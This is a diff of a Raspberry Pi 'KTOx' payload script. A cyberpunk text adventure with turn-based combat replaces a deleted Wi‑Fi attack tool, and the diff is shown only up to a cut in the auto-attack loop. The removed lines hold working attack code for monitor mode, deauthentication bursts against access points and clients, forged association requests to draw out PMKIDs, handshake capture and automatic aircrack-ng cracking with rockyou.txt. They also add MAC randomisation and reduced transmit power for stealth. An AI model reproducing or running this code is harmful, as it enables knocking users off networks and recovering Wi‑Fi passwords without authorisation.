@@ -1,53 +1,41 @@
 #!/usr/bin/env python3
 """
-KTOx Payload – KTOxGOTCHI (Ultimate)
-======================================
-Author: wickednull
+KTOx Payload – CybrPnk2087 (with Combat & Extended Story)
+author: wickednull
+=======================================================================
+Massive text adventure with turn‑based combat, inventory, health, shopping,
+central hub, and a longer story (5 new acts). Press KEY2 to return to hub,
+KEY1 for inventory.
 
-- Full 4-way handshake capture + PMKID + half‑handshake
-- Auto‑attack mode (continuous) or manual target selection
-- Integrated cracking (aircrack-ng with rockyou.txt)
-- Cute faces with blinking
-- Channel hopping with client prioritisation
-- Deauth backoff, whitelist, stealth mode
-- Log viewer, lifetime stats
-
-Controls:
-  OK         Start / Pause capture
-  UP/DOWN    Scroll targets (manual mode) / stats views
-  LEFT/RIGHT Toggle deauth ON/OFF
-  KEY1       Cycle views: face > stats > captures
-  KEY2       Toggle auto‑attack mode (continuous)
-  KEY3       Exit
-
-Loot: /root/KTOx/loot/Pwnagotchi/
-Dependencies: scapy, aircrack-ng, RPi.GPIO, LCD_1in44, PIL
+Controls: 
+  UP/DOWN = scroll text / move cursor
+  OK = next page / select
+  KEY1 = inventory
+  KEY2 = return to Afterlife hub
+  KEY3 = exit
 """
 
 import os
 import sys
 import time
-import json
-import threading
-import subprocess
 import random
-import re
-from datetime import datetime
-from collections import deque
+import textwrap
+import json
+
+import RPi.GPIO as GPIO
+import LCD_1in44
+from PIL import Image, ImageDraw, ImageFont
 
 # ----------------------------------------------------------------------
-# Hardware & LCD
+# Paths
 # ----------------------------------------------------------------------
-try:
-    import RPi.GPIO as GPIO
-    import LCD_1in44
-    from PIL import Image, ImageDraw, ImageFont
-    HAS_HW = True
-except ImportError:
-    HAS_HW = False
-    print("KTOx hardware not found")
-    sys.exit(1)
+LOOT_DIR = "/root/KTOx/loot"
+os.makedirs(LOOT_DIR, exist_ok=True)
+SAVE_FILE = os.path.join(LOOT_DIR, "cyberpunk_save.json")
 
+# ----------------------------------------------------------------------
+# Hardware
+# ----------------------------------------------------------------------
 PINS = {
     "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
     "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
@@ -65,9 +53,8 @@ def font(size=9):
         return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
     except:
         return ImageFont.load_default()
-f9 = font(9)
-f11 = font(11)
-f14 = font(14)
+FONT = font(9)
+FONT_BOLD = font(10)
 
 def wait_btn(timeout=0.1):
     start = time.time()
@@ -79,1052 +66,1385 @@ def wait_btn(timeout=0.1):
         time.sleep(0.02)
     return None
 
-# ----------------------------------------------------------------------
-# Paths & config
-# ----------------------------------------------------------------------
-LOOT_DIR = "/root/KTOx/loot/Pwnagotchi"
-STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
-CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
-HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")
-CRACKED_DIR = os.path.join(LOOT_DIR, "cracked")
-os.makedirs(LOOT_DIR, exist_ok=True)
-os.makedirs(HANDSHAKE_DIR, exist_ok=True)
-os.makedirs(CRACKED_DIR, exist_ok=True)
+def wait_for_release(btn_name):
+    pin = PINS[btn_name]
+    while GPIO.input(pin) == 0:
+        time.sleep(0.02)
 
-WORDLIST = "/usr/share/wordlists/rockyou.txt"
-if not os.path.exists(WORDLIST):
-    WORDLIST = "/usr/share/john/password.lst"
+# ==============================
+# Combat System
+# ==============================
+class Combatant:
+    def __init__(self, name, hp, attack, defense=0, abilities=None):
+        self.name = name
+        self.max_hp = hp
+        self.hp = hp
+        self.attack = attack
+        self.defense = defense
+        self.abilities = abilities or []
 
-# ----------------------------------------------------------------------
-# Scapy
-# ----------------------------------------------------------------------
-try:
-    from scapy.all import (
-        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
-        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
-        sendp, sniff as scapy_sniff, wrpcap, conf,
-    )
-    SCAPY_OK = True
-except ImportError:
-    SCAPY_OK = False
+    def is_alive(self):
+        return self.hp > 0
 
-# ----------------------------------------------------------------------
-# Constants
-# ----------------------------------------------------------------------
-CHANNELS_24_PRIORITY = [1, 6, 11]
-CHANNELS_24_ALL = list(range(1, 14))
-CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64]
-DWELL_PRIORITY = 3
-DWELL_OTHER = 1
-DWELL_5GHZ = 2
-DWELL_DEAUTH = 8
-DEAUTH_BURST_ROUNDS = 7
-HALF_HS_MIN = 2
-MAX_DEAUTH_APS = 5
-MAX_DEAUTH_CLIENTS = 10
-MIN_DEAUTH_SIGNAL = -85
-MAX_DEAUTHS_PER_BSSID = 10
-AP_TTL = 120
-STA_TTL = 300
-EAPOL_TTL = 30
-MAX_BEACON_CACHE = 200
-MAX_PEERS = 50
+    def take_damage(self, dmg):
+        dmg = max(1, dmg - self.defense)
+        self.hp = max(0, self.hp - dmg)
+        return dmg
 
-# ----------------------------------------------------------------------
-# Global state
-# ----------------------------------------------------------------------
-shutdown = threading.Event()
-capture_event = threading.Event()
-lock = threading.Lock()
-
-deauth_enabled = True
-stealth_enabled = False
-auto_attack = False          # auto mode (continuous)
-current_channel = 1
-mood = "normal"
-start_time = time.time()
-capture_flash = 0
-
-session_aps = {}
-session_clients = {}
-session_handshakes = 0
-session_half_hs = 0
-session_pmkid = 0
-session_deauths = 0
-captured_bssids = set()
-eapol_buffer = {}
-beacon_cache = {}
-last_capture_ssid = ""
-
-channel_activity = {ch: 0 for ch in range(1, 14)}
-activity_history = deque([0] * 20, maxlen=20)
-peers_detected = set()
-
-lifetime_handshakes = 0
-lifetime_half_hs = 0
-lifetime_pmkid = 0
-lifetime_networks = 0
-cracked_count = 0
-
-whitelist_macs = set()
-whitelist_ssids = set()
-
-mon_iface = None
-original_mac = ""
-
-view = "face"
-scroll = 0
-networks = []           # list of dicts for manual selection
-selected_idx = 0
-auto_attack_thread = None
-auto_attack_stop = threading.Event()
-
-# Cute faces (original KTOxGOTCHI style)
-faces = {
-    "normal":   "(◕‿‿◕)",
-    "happy":    "(◕‿‿◕)",
-    "attacking": "(⌐■_■)",
-    "lost":     "(X\\/X)",
-    "assoc":    "(°▃▃°)",
-    "excited":  "(☼‿‿☼)",
-    "missed":   "(☼/\\☼)",
-    "searching": "(ಠ_↼ )",
-    "stealth":  "(#‿‿#)",
-    "sleeping": "(－_－)",
-}
-mood_timer = None
-
-def set_mood(new_mood):
-    global mood, mood_timer
-    mood = new_mood
-    if mood_timer:
-        mood_timer.cancel()
-    if new_mood in ("attacking", "assoc", "lost", "missed", "searching"):
-        mood_timer = threading.Timer(2.0, lambda: set_mood("normal"))
-        mood_timer.start()
-    elif new_mood == "happy":
-        mood_timer = threading.Timer(4.0, lambda: set_mood("normal"))
-        mood_timer.start()
-    elif new_mood == "excited":
-        mood_timer = threading.Timer(3.0, lambda: set_mood("normal"))
-        mood_timer.start()
-
-# ----------------------------------------------------------------------
-# Config & stats
-# ----------------------------------------------------------------------
-def load_stats():
-    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks, cracked_count
-    if os.path.isfile(STATS_FILE):
-        try:
-            with open(STATS_FILE, "r") as f:
-                d = json.load(f)
-            lifetime_handshakes = d.get("handshakes", 0)
-            lifetime_half_hs = d.get("half_hs", 0)
-            lifetime_pmkid = d.get("pmkid", 0)
-            lifetime_networks = d.get("networks", 0)
-            cracked_count = d.get("cracked", 0)
-        except: pass
-
-def save_stats():
-    try:
-        with open(STATS_FILE, "w") as f:
-            json.dump({
-                "handshakes": lifetime_handshakes,
-                "half_hs": lifetime_half_hs,
-                "pmkid": lifetime_pmkid,
-                "networks": lifetime_networks,
-                "cracked": cracked_count,
-                "last_session": datetime.now().isoformat(),
-            }, f, indent=2)
-    except: pass
-
-def load_config():
-    global whitelist_macs, whitelist_ssids, deauth_enabled
-    if os.path.isfile(CONFIG_FILE):
-        try:
-            with open(CONFIG_FILE, "r") as f:
-                d = json.load(f)
-            whitelist_macs = set(d.get("whitelist_macs", []))
-            whitelist_ssids = set(d.get("whitelist_ssids", []))
-            deauth_enabled = d.get("deauth_enabled", True)
-        except: pass
-
-def save_config():
-    with open(CONFIG_FILE, "w") as f:
-        json.dump({
-            "whitelist_macs": sorted(whitelist_macs),
-            "whitelist_ssids": sorted(whitelist_ssids),
-            "deauth_enabled": deauth_enabled,
-        }, f, indent=2)
-
-# ----------------------------------------------------------------------
-# Interface & monitor mode
-# ----------------------------------------------------------------------
-def get_mac(iface):
-    try:
-        with open(f"/sys/class/net/{iface}/address") as f:
-            return f.read().strip().upper()
-    except: return ""
-
-def randomize_mac(iface):
-    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
-    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
-
-def restore_mac(iface, mac):
-    if not mac: return
-    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
-
-def reduce_tx_power(iface):
-    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "500"], capture_output=True)
-
-def restore_tx_power(iface):
-    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "auto"], capture_output=True)
-
-def monitor_up(iface):
-    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True)
-    subprocess.run(["sudo", "iw", iface, "set", "monitor", "none"], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
-    time.sleep(0.5)
-    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True)
-    if "type monitor" in r.stdout:
-        return iface
-    subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True)
-    mon = f"{iface}mon"
-    if os.path.exists(f"/sys/class/net/{mon}"):
-        return mon
-    return iface
-
-def monitor_down(iface):
-    if not iface: return
-    base = iface[:-3] if iface.endswith("mon") else iface
-    subprocess.run(["sudo", "airmon-ng", "stop", iface], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", base, "down"], capture_output=True)
-    subprocess.run(["sudo", "iw", base, "set", "type", "managed"], capture_output=True)
-    subprocess.run(["sudo", "ip", "link", "set", base, "up"], capture_output=True)
-
-def get_available_wifi():
-    interfaces = []
-    for name in os.listdir("/sys/class/net"):
-        if name.startswith("wlan") and os.path.exists(f"/sys/class/net/{name}/wireless"):
-            interfaces.append(name)
-    return interfaces
-
-def select_interface():
-    ifaces = get_available_wifi()
-    if not ifaces:
-        return None
-    # Prefer wlan1 (USB dongle) over wlan0 (onboard)
-    if "wlan1" in ifaces:
-        return "wlan1"
-    return ifaces[0]
-
-# ----------------------------------------------------------------------
-# Cracking helper
-# ----------------------------------------------------------------------
-def try_crack(cap_path, essid, bssid):
-    global cracked_count
-    if not os.path.exists(WORDLIST):
-        return None
-    result = subprocess.run(f"aircrack-ng -w {WORDLIST} {cap_path} 2>/dev/null", shell=True, capture_output=True, text=True)
-    m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
-    if m:
-        password = m.group(1)
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
-        cracked_file = os.path.join(CRACKED_DIR, f"{safe}_{bssid}_{ts}.txt")
-        with open(cracked_file, "w") as f:
-            f.write(f"ESSID: {essid}\nBSSID: {bssid}\nPASSWORD: {password}\nDate: {datetime.now().isoformat()}\n")
-        cracked_count += 1
-        save_stats()
-        return password
-    return None
-
-# ----------------------------------------------------------------------
-# Packet handler (handshake + PMKID)
-# ----------------------------------------------------------------------
-def save_capture(bssid, essid, pkts, ctype):
-    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    fname = f"{ctype}_{safe}_{ts}.pcap"
-    full = os.path.join(HANDSHAKE_DIR, fname)
-    bcn = beacon_cache.get(bssid)
-    save_pkts = [bcn] if bcn else []
-    save_pkts.extend(pkts)
-    wrpcap(full, save_pkts)
-    # Auto-crack
-    password = try_crack(full, essid, bssid)
-    if password:
-        print(f"[CRACKED] {essid} -> {password}")
-    return fname
-
-def packet_handler(pkt):
-    global session_handshakes, session_half_hs, session_pmkid, lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
-    global last_capture_ssid, capture_flash
-
-    if shutdown.is_set() or not capture_event.is_set():
-        return
-    if not pkt.haslayer(Dot11):
-        return
-    if pkt[Dot11].type == 1:  # control frames
-        return
-
-    # Beacons
-    if pkt.haslayer(Dot11Beacon):
-        bssid = (pkt[Dot11].addr2 or "").upper()
-        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
-            return
-        try:
-            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
-        except:
-            essid = ""
-        if not essid:
-            essid = "<hidden>"
-        if bssid in whitelist_macs or essid in whitelist_ssids:
-            return
-        sig = getattr(pkt, "dBm_AntSignal", -99)
-        with lock:
-            if bssid not in beacon_cache:
-                beacon_cache[bssid] = pkt
-            if bssid not in session_aps:
-                session_aps[bssid] = {
-                    "essid": essid, "channel": current_channel,
-                    "signal": sig, "clients": set(), "last_seen": time.time(),
-                }
-            else:
-                session_aps[bssid]["signal"] = sig
-                session_aps[bssid]["last_seen"] = time.time()
-            channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
-
-    # Clients (data frames)
-    if pkt[Dot11].type == 2:
-        src = (pkt[Dot11].addr2 or "").upper()
-        bss = (pkt[Dot11].addr3 or "").upper()
-        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
-            with lock:
-                session_aps[bss]["clients"].add(src)
-                session_clients[src] = {"bssid": bss, "last_seen": time.time()}
-                channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
-
-    # EAPOL handshake / PMKID
-    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
-        src = (pkt[Dot11].addr2 or "").upper()
-        dst = (pkt[Dot11].addr1 or "").upper()
-        pair = tuple(sorted([src, dst]))
-        with lock:
-            if pair not in eapol_buffer:
-                eapol_buffer[pair] = []
-            eapol_buffer[pair].append(pkt)
-            msg_count = len(eapol_buffer[pair])
-            bssid = None
-            for mac in pair:
-                if mac in session_aps:
-                    bssid = mac
-                    break
-            if not bssid:
-                return
-
-            # PMKID extraction from M1
-            if bssid == src and bssid not in captured_bssids:
-                try:
-                    eapol_raw = bytes(pkt[EAPOL])
-                    if len(eapol_raw) > 99:
-                        key_info = int.from_bytes(eapol_raw[5:7], "big")
-                        is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)
-                        if is_m1:
-                            data_len = int.from_bytes(eapol_raw[97:99], "big")
-                            key_data = eapol_raw[99:99+data_len]
-                            i = 0
-                            while i+6 < len(key_data):
-                                kde_type = key_data[i]
-                                kde_len = key_data[i+1]
-                                if kde_type == 0xdd and kde_len >= 20:
-                                    oui = key_data[i+2:i+5]
-                                    data_type = key_data[i+5]
-                                    if oui == b'\x00\x0f\xac' and data_type == 4:
-                                        pmkid = key_data[i+6:i+22]
-                                        if pmkid != b'\x00'*16:
-                                            captured_bssids.add(bssid)
-                                            session_pmkid += 1
-                                            lifetime_pmkid += 1
-                                            lifetime_networks += 1
-                                            essid = session_aps.get(bssid, {}).get("essid", "unknown")
-                                            last_capture_ssid = essid
-                                            capture_flash = 30
-                                            fname = save_capture(bssid, essid, [pkt], "pmkid")
-                                            set_mood("happy")
-                                        break
-                                i += (2 + kde_len) if kde_len > 0 else 2
-                except: pass
-
-            # Full handshake (4 messages)
-            if bssid not in captured_bssids and msg_count >= 4:
-                captured_bssids.add(bssid)
-                session_handshakes += 1
-                lifetime_handshakes += 1
-                lifetime_networks += 1
-                essid = session_aps.get(bssid, {}).get("essid", "unknown")
-                last_capture_ssid = essid
-                capture_flash = 30
-                pkts = list(eapol_buffer[pair])
-                eapol_buffer[pair] = []
-                fname = save_capture(bssid, essid, pkts, "hs4")
-                set_mood("happy")
-
-            # Limit buffer
-            if len(eapol_buffer[pair]) > 8:
-                eapol_buffer[pair] = eapol_buffer[pair][-4:]
-
-# ----------------------------------------------------------------------
-# Half-handshake checker
-# ----------------------------------------------------------------------
-def half_hs_checker():
-    while not shutdown.is_set() and capture_event.is_set():
-        if shutdown.wait(timeout=10):
-            break
-        if not capture_event.is_set():
-            break
-        with lock:
-            now = time.time()
-            stale = []
-            for pair, pkts in eapol_buffer.items():
-                if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
-                    try:
-                        if now - pkts[0].time > 15:
-                            stale.append(pair)
-                    except:
-                        stale.append(pair)
-            for pair in stale:
-                pkts = eapol_buffer.pop(pair, [])
-                if len(pkts) < HALF_HS_MIN:
-                    continue
-                bssid = None
-                for mac in pair:
-                    if mac in session_aps:
-                        bssid = mac
-                        break
-                if bssid and bssid not in captured_bssids:
-                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
-                    captured_bssids.add(bssid)
-                    session_half_hs += 1
-                    lifetime_half_hs += 1
-                    lifetime_networks += 1
-                    last_capture_ssid = essid
-                    capture_flash = 20
-                    save_capture(bssid, essid, pkts, "hs_half")
-                    set_mood("happy")
-        time.sleep(2)
-
-# ----------------------------------------------------------------------
-# Deauth helpers
-# ----------------------------------------------------------------------
-def should_deauth(bssid):
-    info = deauth_backoff.get(bssid)
-    if not info: return True
-    if info["count"] >= MAX_DEAUTHS_PER_BSSID: return False
-    if time.time() < info["skip_until"]: return False
-    return True
-
-def record_deauth(bssid):
-    if bssid not in deauth_backoff:
-        deauth_backoff[bssid] = {"count": 0, "skip_until": 0}
-    info = deauth_backoff[bssid]
-    info["count"] += 1
-    if info["count"] >= 6:
-        info["skip_until"] = time.time() + 150
-    elif info["count"] >= 3:
-        info["skip_until"] = time.time() + 60
-
-def send_deauth_burst(bssid, clients, iface):
-    reasons = [7,1,4]
-    pkts = []
-    for reason in reasons:
-        pkts.append(RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
-    for client in clients[:MAX_DEAUTH_CLIENTS]:
-        for reason in reasons:
-            pkts.append(RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
-            pkts.append(RadioTap() / Dot11(addr1=bssid, addr2=client, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason))
-    for _ in range(DEAUTH_BURST_ROUNDS):
-        sendp(pkts, iface=iface, count=1, inter=0, verbose=False)
-
-def active_pmkid_probe(bssid, essid, iface):
-    if bssid in captured_bssids or bssid in whitelist_macs or essid in whitelist_ssids:
-        return
-    if not essid or essid == "<hidden>":
-        return
-    our_mac = get_mac(iface) or "02:00:00:00:00:01"
-    try:
-        auth = RadioTap() / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid, type=0, subtype=11) / Dot11Auth(algo=0, seqnum=1, status=0)
-        sendp(auth, iface=iface, count=1, verbose=False)
-        time.sleep(0.1)
-        rsn_ie = bytes([0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00])
-        assoc = RadioTap() / Dot11(addr1=bssid, addr2=our_mac, addr3=bssid, type=0, subtype=0) / Dot11AssoReq(cap=0x1104, listen_interval=3) / Dot11Elt(ID=0, info=essid.encode()) / Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96') / Dot11Elt(ID=48, info=rsn_ie)
-        sendp(assoc, iface=iface, count=1, verbose=False)
-    except: pass
-
-# ----------------------------------------------------------------------
-# Channel hopping & scanning
-# ----------------------------------------------------------------------
-def set_channel(ch):
-    global current_channel
-    subprocess.run(["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)], capture_output=True)
-    current_channel = ch
-
-def dwell(seconds):
-    return not shutdown.wait(seconds) and capture_event.is_set()
-
-def scan_networks_quick(timeout=5):
-    """Quick scan to update AP list for manual mode."""
-    global networks
-    tmp = "/tmp/ktoxgotchi_scan"
-    subprocess.run(f"rm -f {tmp}*", shell=True)
-    subprocess.run(
-        f"timeout {timeout} airodump-ng --output-format csv -w {tmp} {mon_iface}",
-        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-    )
-    time.sleep(1)
-    nets = []
-    csv_file = f"{tmp}-01.csv"
-    if os.path.exists(csv_file):
-        with open(csv_file, errors="ignore") as f:
-            content = f.read()
-        if "Station MAC" in content:
-            content = content.split("Station MAC")[0]
-        lines = content.strip().split("\n")
-        header_idx = -1
-        for i, line in enumerate(lines):
-            if "BSSID" in line and "ESSID" in line:
-                header_idx = i
-                break
-        if header_idx >= 0:
-            headers = [h.strip() for h in lines[header_idx].split(",")]
-            try:
-                col_bssid = headers.index("BSSID")
-                col_ch = headers.index("channel")
-                col_essid = headers.index("ESSID")
-            except:
-                return
-            for line in lines[header_idx+1:]:
-                if not line.strip():
-                    continue
-                parts = [p.strip() for p in line.split(",")]
-                if len(parts) <= max(col_bssid, col_ch, col_essid):
-                    continue
-                bssid = parts[col_bssid]
-                if not re.match(r"([0-9A-Fa-f]{2}:){5}", bssid):
-                    continue
-                essid = parts[col_essid]
-                if essid and essid != "(not associated)":
-                    ch = parts[col_ch]
-                    nets.append({
-                        "bssid": bssid,
-                        "essid": essid,
-                        "channel": ch
-                    })
-    networks = nets
-
-def channel_hopper():
-    """Main capture loop: channel hopping + deauth + PMKID probes."""
-    checked_5g = set()
-    supported_5g = set()
-    while not shutdown.is_set() and capture_event.is_set():
-        # Scan hot channels first (APs with clients, uncaptured)
-        hot = {}
-        with lock:
-            for bssid, info in session_aps.items():
-                ch = info.get("channel")
-                if not ch: continue
-                cli = len(info.get("clients", set()))
-                uncap = (bssid not in captured_bssids and
-                         bssid not in whitelist_macs and
-                         info.get("essid") not in whitelist_ssids)
-                hot[ch] = hot.get(ch, (0, False))
-                hot[ch] = (hot[ch][0] + cli, hot[ch][1] or uncap)
-        hot_list = [(ch, cli) for ch, (cli, uncap) in hot.items() if uncap and cli > 0]
-        hot_list.sort(key=lambda x: x[1], reverse=True)
-        visited = set()
-        for ch, _ in hot_list:
-            if not capture_event.is_set():
-                return
-            set_channel(ch)
-            visited.add(ch)
-            # Deauth on this channel
-            deauthed = 0
-            with lock:
-                targets = [(b, info) for b, info in session_aps.items()
-                           if info.get("channel") == ch and b not in captured_bssids
-                           and b not in whitelist_macs
-                           and info.get("essid") not in whitelist_ssids
-                           and should_deauth(b)]
-            for bssid, info in targets[:MAX_DEAUTH_APS]:
-                clients = list(info.get("clients", set()))
-                if clients:
-                    send_deauth_burst(bssid, clients, mon_iface)
-                    record_deauth(bssid)
-                    deauthed += 1
-                # PMKID probe for clientless APs
-                if not clients and info.get("essid"):
-                    active_pmkid_probe(bssid, info["essid"], mon_iface)
-            dwell(DWELL_DEAUTH if deauthed > 0 else DWELL_PRIORITY)
-
-        # Other 2.4GHz channels
-        for ch in CHANNELS_24_ALL:
-            if ch in visited:
+def combat_encounter(player_crew, enemies, game):
+    while True:
+        for member in player_crew:
+            if not member.is_alive():
                 continue
-            if not capture_event.is_set():
-                return
-            set_channel(ch)
-            dwell(DWELL_OTHER)
-
-        # 5GHz channels
-        for ch in CHANNELS_5:
-            if not capture_event.is_set():
-                return
-            if ch in checked_5g and ch not in supported_5g:
+            action = menu_choice(["Attack", "Cyberware", "Item", "Switch"], title=f"{member.name}'s turn")
+            if action == -1:
+                return "hub"
+            if action == 0:
+                target_idx = menu_choice([f"{e.name} HP:{e.hp}/{e.max_hp}" for e in enemies], title="Attack whom?")
+                if target_idx == -1:
+                    return "hub"
+                target = enemies[target_idx]
+                dmg = member.attack + random.randint(-2, 4)
+                actual = target.take_damage(dmg)
+                show_message(f"{member.name} hits {target.name} for {actual} damage!")
+                if not target.is_alive():
+                    show_message(f"{target.name} is defeated!")
+                    enemies.remove(target)
+                    if not enemies:
+                        show_message("Victory!")
+                        return True
+            elif action == 1:
+                if not member.abilities:
+                    show_message("No cyberware equipped.")
+                    continue
+                abil_idx = menu_choice([a[0] for a in member.abilities], title="Select ability")
+                if abil_idx == -1:
+                    return "hub"
+                ability = member.abilities[abil_idx]
+                target = enemies[0]
+                dmg = int(member.attack * ability[1])
+                actual = target.take_damage(dmg)
+                show_message(f"{member.name} uses {ability[0]}! Deals {actual} damage.")
+                if not target.is_alive():
+                    show_message(f"{target.name} is defeated!")
+                    enemies.remove(target)
+                    if not enemies:
+                        show_message("Victory!")
+                        return True
+            elif action == 2:
+                if not game.inventory:
+                    show_message("No items.")
+                    continue
+                usable = [i for i in game.inventory if i in ["MaxDoc", "Stim"]]
+                if not usable:
+                    show_message("No usable items.")
+                    continue
+                item_idx = menu_choice(usable, title="Use which item?")
+                if item_idx == -1:
+                    return "hub"
+                item = usable[item_idx]
+                if item == "MaxDoc":
+                    heal = 30
+                    member.hp = min(member.max_hp, member.hp + heal)
+                    if member.name == "Niko":
+                        game.health = member.hp
+                    game.inventory.remove(item)
+                    show_message(f"{member.name} used MaxDoc. +{heal} HP.")
+                elif item == "Stim":
+                    member.attack += 5
+                    game.inventory.remove(item)
+                    show_message(f"{member.name} used Stim. Attack boosted!")
+            elif action == 3:
+                show_message("All crew are already in battle.")
+        for enemy in enemies[:]:
+            if not enemy.is_alive():
                 continue
-            set_channel(ch)
-            checked_5g.add(ch)
-            if subprocess.run(["iw", "dev", mon_iface, "info"], capture_output=True).returncode == 0:
-                supported_5g.add(ch)
-            dwell(DWELL_5GHZ)
+            alive = [m for m in player_crew if m.is_alive()]
+            if not alive:
+                show_message("Your crew is wiped out...")
+                return False
+            target = random.choice(alive)
+            dmg = enemy.attack + random.randint(-2, 4)
+            actual = target.take_damage(dmg)
+            show_message(f"{enemy.name} attacks {target.name} for {actual} damage!")
+            if not target.is_alive():
+                show_message(f"{target.name} is down!")
+                player_crew.remove(target)
+        if not any(m.is_alive() for m in player_crew):
+            return False
 
-        if stealth_enabled:
-            randomize_mac(mon_iface)
+# ==============================
+# UI Helpers
+# ==============================
+def wrap_text(text, width=18):
+    return textwrap.wrap(text, width=width)
 
-# ----------------------------------------------------------------------
-# Sniffer thread
-# ----------------------------------------------------------------------
-def sniffer_thread():
-    if not SCAPY_OK or not mon_iface:
-        return
-    try:
-        conf.bufsize = 4*1024*1024
-    except: pass
-    scapy_sniff(iface=mon_iface, prn=packet_handler,
-                stop_filter=lambda _: shutdown.is_set() or not capture_event.is_set(),
-                store=0)
-
-# ----------------------------------------------------------------------
-# Auto-attack worker (continuous)
-# ----------------------------------------------------------------------
-def auto_attack_worker():
-    while auto_attack and not auto_attack_stop.is_set() and capture_event.is_set():
-        try:
-            # Scan for networks
-            scan_networks_quick(8)
-            if not networks:
-                time.sleep(5)
-                continue
-            # Find AP with clients
-            attacked = False
-            for net in networks:
-                if not capture_event.is_set() or auto_attack_stop.is_set():
-                    break
-                bssid = net["bssid"]
-                essid = net["essid"]
-                ch = int(net["channel"])
-                # Get clients on this AP
-                tmp = f"/tmp/ktoxgotchi_clients_{bssid.replace(':', '_')}"
-                subprocess.run(f"rm -f {tmp}*", shell=True)
-                subprocess.run(
-                    f"timeout 5 airodump-ng -c {ch} --bssid {bssid} -w {tmp} {mon_iface}",
-                    shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-                time.sleep(1)
-                clients = []
-                csv_file = f"{tmp}-01.csv"
-                if os.path.exists(csv_file):
-                    with open(csv_file, errors="ignore") as f:
-                        content = f.read()
-                    if "Station MAC" in content:
-                        station_section = content.split("Station MAC")[1]
-                        for line in station_section.strip().split("\n"):
-                            parts = [p.strip() for p in line.split(",")]
-                            if parts and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
-                                clients.append(parts[0])
-                if clients:
-                    set_mood("assoc")
-                    # Attack
-                    tmp_hs = f"/tmp/ktoxgotchi_auto_{bssid.replace(':', '_')}"
-                    subprocess.run(f"rm -f {tmp_hs}*", shell=True)
-                    proc = subprocess.Popen(
-                        f"airodump-ng -c {ch} --bssid {bssid} -w {tmp_hs} {mon_iface}",
-                        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                    )
-                    time.sleep(2)
-                    client = random.choice(clients)
-                    subprocess.run(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {mon_iface}",
-                                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    time.sleep(3)
-                    proc.terminate()
-                    time.sleep(1)
-                    cap_file = f"{tmp_hs}-01.cap"
-                    if os.path.exists(cap_file):
-                        aircrack_out = subprocess.run(f"aircrack-ng {cap_file} 2>/dev/null", shell=True, capture_output=True, text=True).stdout
-                        if "handshake" in aircrack_out.lower():
-                            # Save handshake
-                            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-                            safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
-                            dest = os.path.join(HANDSHAKE_DIR, f"{safe_essid}_{bssid}_{ts}.cap")
-                            subprocess.run(f"cp {cap_file} {dest}", shell=True)
-                            with open(os.path.join(LOOT_DIR, "handshake_log.txt"), "a") as log:
-                                log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
-                            session_handshakes += 1
-                            lifetime_handshakes += 1
-                            save_stats()
